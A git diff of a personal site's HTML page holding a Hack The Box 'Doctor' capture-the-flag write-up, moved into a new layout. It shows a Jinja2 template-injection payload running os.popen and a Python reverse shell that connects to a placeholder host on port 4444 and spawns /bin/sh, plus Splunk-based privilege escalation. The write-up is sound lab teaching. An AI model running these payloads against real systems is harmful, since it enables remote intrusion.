@@ -1,16 +1,16 @@
 <!doctype html>
 <html lang="en" class="h-100">
-  
+
 	<head>
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 		<meta name="description" content="">
-		<title>Chris Federico · Doctor</title>
+		<title>Chris Federico · Homepage</title>
 
 		<link rel="canonical" href="https://getbootstrap.com/docs/5.0/examples/cover/">
 
 		<!-- Bootstrap core CSS -->
-		<link href="css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
+		<link href="../css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BmbxuPwQa2lc/FVzBcNJ7UAyJxM6wuqIj61tLrc4wSX0szH/Ev+nYRRuWlolflfl" crossorigin="anonymous">
 
 		<!-- Favicons -->
 		<link rel="apple-touch-icon" href="/docs/5.0/assets/img/favicons/apple-touch-icon.png" sizes="180x180">
@@ -23,125 +23,141 @@
 		<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
 		<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
 		<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-		
+
 		<!-- Custom styles for this template -->
-		<link href="css/cover.css" rel="stylesheet">
-  	</head>
-
-	<body class="d-flex h-100 text-white bg-dark">
-    
+		<link href="../css/cover.css" rel="stylesheet">
+	</head>
+	<body class="d-flex h-100 text-center text-white bg-dark">
 		<div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
-
-			<h1 id="user-access">User access</h1><br>	
-				<h2 id="scan">Scan</h2>
-					<p>As always I started by running nmap on the target IP in search of open ports</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/nmap.PNG" />
-					</div><br>
-
-					<p>This is a Linux machine and ports 22, 80 and 8089 are open, this is more than enough. I proceeded by visiting the webserver on port 80 and running gobuster looking for some useful directories.</p>
-			
-				<h2 id="enumeration">Enumeration</h2>
-					<p>There's nothing interesting enumerating the webserver's directories, I used a small wordlist, you can try something bigger but I didn't need this anyway.</p><br>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/dirb.PNG" />
-					</div><br>
-			
-				<h2 id="webserver">Webserver</h2>
-					<p>This is the website homepage, there is nothing really interesting except for a domain named <strong>doctors.htb</strong></p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/webserver.PNG" />
-					</div><br>
-
-				<h2 id="virtual-host">Virtual host</h2>
-					<p>I added <em>doctors.htb</em> into my <strong>/etc/hosts</strong> file and visited the URL again, now there's <strong>actually</strong> something interesting: a login page!</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/login.PNG" />
-					</div><br>
-					
-					<p>At this point I thought that I might have found something more useful enumerating the directories. So I ran gobuster once again.</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/dirb-vhost.PNG" />
-					</div><br>
-
-					<p>Nothing out of the ordinary, apparently. I noticed an <em>archive</em> folder and explored in the URL. Nothing happens but it's quite suspicious.</p>
-			
-				<h2 id="messing-up-with-loginregister-page">Messing up with login/register page</h2>
-					<p>I've tried some simple SQL injection but nothing worked, so I started looking around for other pages, I first checked the register page. Is a simple form, I didn't find anything interesting, XSS doesn't work and there are no exploitable file uploads either. At this point I tried to register a new user.</p>
-					<p>At this point you are redirected to the homepage, there is a section when you can submit a post with a title and a content. The post will be shown on the homepage.</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/board.PNG" />
-					</div><br>
-
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/homepage.PNG" /></p>				
-					</div><br>
-
-					<p>I think there might be a vulnerability here somewhere, so I documented myself about how exploiting form submissions and I found an interesting document about <strong>Server-side Template Injection</strong> (SSTI). You can find a nicely documented methodology on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">this repo</a>.</p>
-					<p>Now we might have a initial foothold on what to do on this machine.</p>
-
-				<h2 id="exploiting-the-template">Exploiting the template</h2>
-					<p>By looking the graph in the previous repo (under the &quot;Methodology&quot; section) there is a nice <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png">flowchart</a> where we notice how we can exploit a template by injecting some values in order to find if they are processed and, at the end, discover which framework is running under the webserver.</p>
-					<p>The real question now is: <strong>where should the expressions be evaluated?</strong> Looking around I remembered the <strong>archive</strong> directory I found while enumerating. So I wrote a very simple payload based on the flowchart and checked out the archive directory. Bingo!</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/example-payload.PNG" />
-					</div><br>
-
-					<p>This was the result of the expression:</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/example-payload2.PNG" />
-					</div><br>
-					
-					<p>After a couple of attempts following the flowchart I found that the framework under the hood is Jinja2, which is written in Python. This is a very useful information as I'm now aware of the language I have to use if I want to write and run payloads.</p>
-					<p>What I had to do was to write a python payload in order to open a shell on my machine.</p>
-			
-				<h2 id="writing-the-payload">Writing the payload</h2>
-					<p>This is honestly the part where I struggled the most. Mostly because I didn't know the Jinja engine. The first part was to write a python script in order to run simple commands, so I tried things like {{import os; os.system(&quot;whoami&quot;);}} but nothing worked. Since I was stuck on this part I asked help to users on HTB chats and forums for a nudge. I found this piece of conversation to be somehow helpful.</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/chat.PNG" />
-					</div>
-					<p>I was actually missing that the script were ran under a backend engine, so I needed to &quot;crawl&quot; into the engine context in order to require the objects and the methods that I needed to run my payload.</p>
-					<p>While digging on the internet I found an interesting article about <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">SSTI on Jinja2</a>. Here you can find a simple explanation about MRO (which is a way you can exploit in order to run your payload) and the global variables stored into jinja's context. In particular we have the <strong>request</strong> object, from which we can write something like this:</p>
-					<p>{{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('id').read()}}</p>
-
-					<p>From this stub we can write the payload we need in order to open a shell on our machine. Some basic socket code did the trick for me. This was the code I used:</p>
-					<code class="sourceCode python">
-					import socket, os, pty  
-						s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a basic socket with ipv4 addresses and TCP protocol  
-						s.connect(("x.x.x.x", 4444)) # connect to your local machine using port 4444  
-						os.dup2(s.fileno(), 0) # duplicate the socket descriptor on your standard input (0), standard output (1) and standard error (2), in order to display commands output on your terminal  
-						os.dup2(s.fileno(), 1)  
-						os.dup2(s.fileno(), 2)  
-						pty.spawn("/bin/sh") # spawn a shell on your terminal  
-					</code><br>	
-
-				<h2 id="shell-and-privesc">Shell and privesc</h2>
-					<p>Obviously no shell will spawn unless you put your machine on listening on an external port, so I ran netcat in listening mode on port 4444. Ran the URL on the /archive endpoint, a shell will spawn on your terminal!</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/shell.PNG" />
-					</div><br>
-					<p>By enumerating on the machine we can find some useful information. There are 2 users, <em>web</em> and <em>shaun</em>, and we are logged as the first one. As web, we can't do anything except looking for interesting files. I followed <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">this guide</a> for basic privesc commands and in the /var/log/apache2/ directory I found a file named &quot;backup&quot;. By displaying its content on screen I finally found a password!</p>
-					
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/user_password.PNG" />
-					</div><br>
-
-					<p>...Or at least it looks like one. The first thing I tried is to switch from web to shaun. So I used the <em>su</em> command using the password I found, aaaaand we are in! Right now we can search for the user.txt flag, it's located in the /home/shaun directory, so we cat the content and we finally have user.</p>
-					<div class="figure">
-						<img src="/assets/writeups_img/doctor/user-txt.PNG" />
-					</div><br>
-					
-			<h1 id="from-user-to-root">From user to root</h1>
-				<p>I found this part easier than user, I didn't had much informations, but there was one service that I didn't even checked: <strong>the splunk service on port 8089</strong>. Since I didn't found nothing useful by navigating on the service via browser, I searched on the internet for a privesc tool and I found <a href="https://github.com/cnotin/SplunkWhisperer2">this one</a> that exploits misconfigurations on the service. Before using this tool, I suggest to read <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">here</a> in order to fully comprehend the vulnerability you are exploiting.</p>
-				<p>By the way, in order to use this tool, I cloned the repository, opened another terminal window and ran nc on port 9999 and used the PySplunkWhisperer_remote script following the usage instructions. The script did everything for me, and on the netcat window I had a shell as root!</p>
-				<div class="figure">
-					<img src="/assets/writeups_img/doctor/root_shell.PNG" />
-				</div><br>
-				<div class="figure">
-					<img src="/assets/writeups_img/doctor/root_shell2.PNG" />
+			<header class="mb-auto">
+				<div>
+					<h3 class="float-md-start mb-0"></h3>
+					<nav class="nav nav-masthead justify-content-center float-md-end">
+						<a class="nav-link active text-white" aria-current="page" href="../index.html">Home</a>
+						<a class="nav-link text-white" href="../writeups.html">Write-Ups</a>
+					</nav>
 				</div>
+			</header>
+			<hr>
+			<main class="px-3">
 
-		</div>
+				<div class="cover-container d-flex w-100 h-100 p-3 mx-auto flex-column">
+
+					<h1 id="user-access">User access</h1><br>	
+						<h2 id="scan">Scan</h2>
+							<p>As always I started by running nmap on the target IP in search of open ports</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/nmap.PNG" />
+							</div><br>
 		
+							<p>This is a Linux machine and ports 22, 80 and 8089 are open, this is more than enough. I proceeded by visiting the webserver on port 80 and running gobuster looking for some useful directories.</p>
+					
+						<h2 id="enumeration">Enumeration</h2>
+							<p>There's nothing interesting enumerating the webserver's directories, I used a small wordlist, you can try something bigger but I didn't need this anyway.</p><br>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/dirb.PNG" />
+							</div><br>
+					
+						<h2 id="webserver">Webserver</h2>
+							<p>This is the website homepage, there is nothing really interesting except for a domain named <strong>doctors.htb</strong></p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/webserver.PNG" width="60%" />
+							</div><br>
+		
+						<h2 id="virtual-host">Virtual host</h2>
+							<p>I added <em>doctors.htb</em> into my <strong>/etc/hosts</strong> file and visited the URL again, now there's <strong>actually</strong> something interesting: a login page!</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/login.PNG" width="60%"/>
+							</div><br>
+							
+							<p>At this point I thought that I might have found something more useful enumerating the directories. So I ran gobuster once again.</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/dirb-vhost.PNG" />
+							</div><br>
+		
+							<p>Nothing out of the ordinary, apparently. I noticed an <em>archive</em> folder and explored in the URL. Nothing happens but it's quite suspicious.</p>
+					
+						<h2 id="messing-up-with-loginregister-page">Messing up with login/register page</h2>
+							<p>I've tried some simple SQL injection but nothing worked, so I started looking around for other pages, I first checked the register page. Is a simple form, I didn't find anything interesting, XSS doesn't work and there are no exploitable file uploads either. At this point I tried to register a new user.</p>
+							<p>At this point you are redirected to the homepage, there is a section when you can submit a post with a title and a content. The post will be shown on the homepage.</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/board.PNG" width="60%"/>
+							</div><br>
+		
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/homepage.PNG" width="60%"/></p>				
+							</div><br>
+		
+							<p>I think there might be a vulnerability here somewhere, so I documented myself about how exploiting form submissions and I found an interesting document about <strong>Server-side Template Injection</strong> (SSTI). You can find a nicely documented methodology on <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">this repo</a>.</p>
+							<p>Now we might have a initial foothold on what to do on this machine.</p>
+		
+						<h2 id="exploiting-the-template">Exploiting the template</h2>
+							<p>By looking the graph in the previous repo (under the &quot;Methodology&quot; section) there is a nice <a href="https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Template%20Injection/Images/serverside.png">flowchart</a> where we notice how we can exploit a template by injecting some values in order to find if they are processed and, at the end, discover which framework is running under the webserver.</p>
+							<p>The real question now is: <strong>where should the expressions be evaluated?</strong> Looking around I remembered the <strong>archive</strong> directory I found while enumerating. So I wrote a very simple payload based on the flowchart and checked out the archive directory. Bingo!</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/example-payload.PNG" width="60%" />
+							</div><br>
+		
+							<p>This was the result of the expression:</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/example-payload2.PNG" />
+							</div><br>
+							
+							<p>After a couple of attempts following the flowchart I found that the framework under the hood is Jinja2, which is written in Python. This is a very useful information as I'm now aware of the language I have to use if I want to write and run payloads.</p>
+							<p>What I had to do was to write a python payload in order to open a shell on my machine.</p>
+					
+						<h2 id="writing-the-payload">Writing the payload</h2>
+							<p>This is honestly the part where I struggled the most. Mostly because I didn't know the Jinja engine. The first part was to write a python script in order to run simple commands, so I tried things like {{import os; os.system(&quot;whoami&quot;);}} but nothing worked. Since I was stuck on this part I asked help to users on HTB chats and forums for a nudge. I found this piece of conversation to be somehow helpful.</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/chat.PNG" width="60%"/>
+							</div><br>
+							<p>I was actually missing that the script were ran under a backend engine, so I needed to &quot;crawl&quot; into the engine context in order to require the objects and the methods that I needed to run my payload.</p>
+							<p>While digging on the internet I found an interesting article about <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">SSTI on Jinja2</a>. Here you can find a simple explanation about MRO (which is a way you can exploit in order to run your payload) and the global variables stored into jinja's context. In particular we have the <strong>request</strong> object, from which we can write something like this:</p>
+							<p>{{request.application.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>('os').popen('id').read()}}</p>
+		
+							<p>From this stub we can write the payload we need in order to open a shell on our machine. Some basic socket code did the trick for me. This was the code I used:</p>
+							<code class="sourceCode python text-sm-left">
+							import socket, os, pty<br> 
+								s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a basic socket with ipv4 addresses and TCP protocol<br>  
+								s.connect(("x.x.x.x", 4444)) # connect to your local machine using port 4444<br>
+								os.dup2(s.fileno(), 0) # duplicate the socket descriptor on your standard input (0), standard output (1) and standard error (2), in order to display commands output on your terminal<br>  
+								os.dup2(s.fileno(), 1)<br>
+								os.dup2(s.fileno(), 2)<br>
+								pty.spawn("/bin/sh") # spawn a shell on your terminal<br>  
+							</code><br>	
+		
+						<h2 id="shell-and-privesc">Shell and privesc</h2>
+							<p>Obviously no shell will spawn unless you put your machine on listening on an external port, so I ran netcat in listening mode on port 4444. Ran the URL on the /archive endpoint, a shell will spawn on your terminal!</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/shell.PNG" />
+							</div><br>
+							<p>By enumerating on the machine we can find some useful information. There are 2 users, <em>web</em> and <em>shaun</em>, and we are logged as the first one. As web, we can't do anything except looking for interesting files. I followed <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">this guide</a> for basic privesc commands and in the /var/log/apache2/ directory I found a file named &quot;backup&quot;. By displaying its content on screen I finally found a password!</p>
+							
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/user_password.PNG" />
+							</div><br>
+		
+							<p>...Or at least it looks like one. The first thing I tried is to switch from web to shaun. So I used the <em>su</em> command using the password I found, aaaaand we are in! Right now we can search for the user.txt flag, it's located in the /home/shaun directory, so we cat the content and we finally have user.</p>
+							<div class="figure">
+								<img src="/assets/writeups_img/doctor/user-txt.PNG" />
+							</div><br>
+							
+					<h1 id="from-user-to-root">From user to root</h1>
+						<p>I found this part easier than user, I didn't had much informations, but there was one service that I didn't even checked: <strong>the splunk service on port 8089</strong>. Since I didn't found nothing useful by navigating on the service via browser, I searched on the internet for a privesc tool and I found <a href="https://github.com/cnotin/SplunkWhisperer2">this one</a> that exploits misconfigurations on the service. Before using this tool, I suggest to read <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">here</a> in order to fully comprehend the vulnerability you are exploiting.</p>
+						<p>By the way, in order to use this tool, I cloned the repository, opened another terminal window and ran nc on port 9999 and used the PySplunkWhisperer_remote script following the usage instructions. The script did everything for me, and on the netcat window I had a shell as root!</p>
+						<div class="figure">
+							<img src="/assets/writeups_img/doctor/root_shell.PNG" />
+						</div><br>
+						<div class="figure">
+							<img src="/assets/writeups_img/doctor/root_shell2.PNG" />
+						</div>
+		
+				</div>
+			</main>
+			<hr>
+			<footer class="mt-auto text-white-50">
+				<p>Developed by <a href="https://github.com/ChrisFederico" class="text-white">Chris Federico</a></p>
+			</footer>	
+		</div>	
 	</body>
 </html>
